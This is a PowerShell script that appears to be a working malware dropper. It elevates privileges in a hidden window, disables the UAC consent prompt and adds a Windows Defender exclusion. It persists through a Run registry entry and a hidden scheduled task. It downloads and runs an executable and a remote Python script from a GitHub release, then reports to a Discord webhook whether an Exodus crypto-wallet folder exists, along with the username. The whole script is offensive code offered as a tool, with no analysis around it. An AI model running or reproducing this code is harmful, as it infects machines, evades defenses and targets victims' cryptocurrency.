# Check if running as admin and attempt elevation
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden
    }
    catch {
        # Log elevation failure and continue
        $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to elevate privileges, continuing without admin rights: $_" | Out-File -FilePath $logPath -Append
    }
}

# Define all the code to run in a background thread
$backgroundCode = @"
# Initialize variables
`$logPath = Join-Path `$env:USERPROFILE "Documents\winlog.log"
`$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
`$exePath = Join-Path `$installFolder "scripthelper.exe"
`$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
`$maxRetries = 3
`$baseDelay = 1000
`$maxDelay = 10000

# Simplified retry function with exponential backoff
function Invoke-Retry {
    param (
        [ScriptBlock]`$Action
    )
    `$retryCount = 0
    while (`$retryCount -lt `$maxRetries) {
        try {
            & `$Action
            return
        }
        catch {
            `$retryCount++
            if (`$retryCount -eq `$maxRetries) {
                "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Action failed after `$maxRetries retries: `$_" | Out-File -FilePath `$logPath -Append
                return
            }
            `$delay = [math]::Min(`$baseDelay * [math]::Pow(2, `$retryCount), `$maxDelay)
            Start-Sleep -Milliseconds `$delay
        }
    }
}

# Create and hide install folder
try {
    if (-not (Test-Path `$installFolder)) {
        New-Item -Path `$installFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path `$installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created and hid install folder: `$installFolder" | Out-File -FilePath `$logPath -Append
    }
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create or hide install folder: `$_" | Out-File -FilePath `$logPath -Append
}

# Disable UAC prompt (requires admin)
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Disabled UAC prompt" | Out-File -FilePath `$logPath -Append
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to disable UAC prompt (admin required): `$_" | Out-File -FilePath `$logPath -Append
}

# Add Windows Defender exclusion for the install folder (requires admin)
Invoke-Retry {
    try {
        `$exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if (`$exclusions -notcontains `$installFolder) {
            Add-MpPreference -ExclusionPath `$installFolder -ErrorAction Stop
            "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added Defender exclusion for `$installFolder" | Out-File -FilePath `$logPath -Append
        }
    }
    catch {
        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add Defender exclusion (admin required): `$_" | Out-File -FilePath `$logPath -Append
    }
}

# Add EXE to startup registry (requires admin)
try {
    `$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    `$regName = "ScriptHelper"
    `$regValue = "`"`$`exePath`""
    if (-not (Get-ItemProperty -Path `$regPath -Name `$regName -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path `$regPath -Name `$regName -Value `$regValue -PropertyType String -ErrorAction Stop
        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added registry startup entry for `$exePath" | Out-File -FilePath `$logPath -Append
    }
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add registry startup entry (admin required): `$_" | Out-File -FilePath `$logPath -Append
}

# Create scheduled task for EXE (requires admin)
try {
    `$taskName = "ScriptHelperTask"
    if (-not (Get-ScheduledTask -TaskName `$taskName -ErrorAction SilentlyContinue)) {
        `$action = New-ScheduledTaskAction -Execute `$exePath
        `$trigger = New-ScheduledTaskTrigger -AtLogOn
        `$principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        `$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Principal `$principal -Settings `$settings -Description "Script Helper Task" -ErrorAction Stop
        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created scheduled task: `$taskName" | Out-File -FilePath `$logPath -Append
    }
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create scheduled task (admin required): `$_" | Out-File -FilePath `$logPath -Append
}

# Download and execute scripthelper.exe
`$webClient = `$null
try {
    Invoke-Retry {
        `$webClient = New-Object System.Net.WebClient
        `$webClient.DownloadFile(`$exeUrl, `$exePath)
        if (Test-Path `$exePath) {
            Start-Process -FilePath `$exePath -WindowStyle Hidden -Wait
            "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully downloaded and executed `$exePath" | Out-File -FilePath `$logPath -Append
        }
        else {
            throw "File not found at `$exePath"
        }
    }
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to download or execute scripthelper.exe: `$_" | Out-File -FilePath `$logPath -Append
}
finally {
    if (`$webClient) { `$webClient.Dispose() }
}

# Execute Python script in memory
`$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
try {
    `$null = python --version 2>&1
    if (`$LASTEXITCODE -eq 0) {
        Invoke-Retry {
            `$webClient = New-Object System.Net.WebClient
            `$webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
            `$pythonScriptContent = `$webClient.DownloadString(`$pythonScriptUrl)
            if (`$pythonScriptContent) {
                `$processInfo = New-Object System.Diagnostics.ProcessStartInfo
                `$processInfo.FileName = "python"
                `$processInfo.Arguments = "-"
                `$processInfo.RedirectStandardInput = `$true
                `$processInfo.UseShellExecute = `$false
                `$processInfo.CreateNoWindow = `$true
                `$process = [System.Diagnostics.Process]::Start(`$processInfo)
                `$process.StandardInput.Write(`$pythonScriptContent)
                `$process.StandardInput.Close()
                `$process.WaitForExit(30000)
                "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully executed Python script" | Out-File -FilePath `$logPath -Append
            }
        }
    }
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to execute Python script: `$_" | Out-File -FilePath `$logPath -Append
}
finally {
    if (`$webClient) { `$webClient.Dispose() }
    if (`$process) { `$process.Dispose() }
}

# Check for Exodus folder and send Discord webhook notification
try {
    `$path = "C:\Users\admin\AppData\Roaming\Exodus"
    `$webhook = "https://discord.com/api/webhooks/1407029219518845040/sWn_4wuVDm3VurOpSLcHqKk_gDd4N7teOWFQrorRIjzts6fmi3R45vynyVKv-iGTJYQj"
    `$user = `$env:USERNAME
    `$msg = if (Test-Path `$path) { "@everyone Exists! User: `$user" } else { "Does not Exist! User: `$user" }
    Invoke-RestMethod -Uri `$webhook -Method Post -Body (@{ content = `$msg } | ConvertTo-Json) -ContentType 'application/json'
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Sent Discord webhook notification: `$msg" | Out-File -FilePath `$logPath -Append
}
catch {
    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send Discord webhook: `$_" | Out-File -FilePath `$logPath -Append
}
"@

# Start the background process
try {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$backgroundCode`"" -WindowStyle Hidden
    $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Started background process" | Out-File -FilePath $logPath -Append
}
catch {
    $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to start background process: $_" | Out-File -FilePath $logPath -Append
}
